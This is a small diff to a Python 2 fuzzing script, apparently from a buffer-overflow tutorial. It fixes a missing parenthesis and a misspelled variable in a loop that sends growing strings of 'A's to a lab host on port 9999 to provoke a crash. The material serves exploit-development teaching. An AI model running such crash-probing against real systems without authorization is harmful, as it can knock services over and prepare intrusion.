@@ -106,8 +106,8 @@ import socket
 
 for i in range(30):
   s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-  s.connect(("192.168.56.105",9999) # mind to change the IP address :-)
-  payloaod = int(i)*("A"*100)
+  s.connect(("192.168.56.105",9999)) # mind to change the IP address :-)
+  payload = int(i)*("A"*100)
   s.send(payload+"\r\n")
   print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
   s.close()
